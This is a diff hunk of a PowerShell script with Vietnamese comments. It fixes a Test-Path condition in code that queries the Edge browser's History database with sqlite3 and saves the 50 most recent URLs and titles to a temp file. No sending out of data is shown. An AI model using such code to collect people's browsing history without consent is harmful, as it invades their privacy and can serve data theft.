@@ -15,7 +15,7 @@ $outpath = "$env:TEMP\edge_history.txt"
 # Đường dẫn file History của Edge
 $edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
 
-if (Test-Path $edgeHistory -and (Test-Path $sqlitePath)) {
+if ((Test-Path $edgeHistory) -and (Test-Path $sqlitePath)) {
     # Query bằng sqlite3.exe, lấy 50 dòng gần nhất
     & $sqlitePath $edgeHistory "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8
 } else {
